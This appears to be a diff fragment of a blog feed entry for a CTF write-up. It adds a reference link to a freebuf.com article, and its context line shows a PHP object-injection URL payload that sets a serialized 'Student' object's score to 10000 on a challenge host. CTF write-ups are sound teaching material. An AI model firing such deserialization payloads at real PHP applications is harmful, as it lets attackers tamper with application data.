@@ -544,6 +544,7 @@
 <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="image-20191103221650185.png" alt="image-20191103221650185"></p>
+<p><a href="https://www.freebuf.com/news/172507.html">参考文章1</a></p>
 </script></p>]]></content>
       <categories>
         <category>CTF</category>
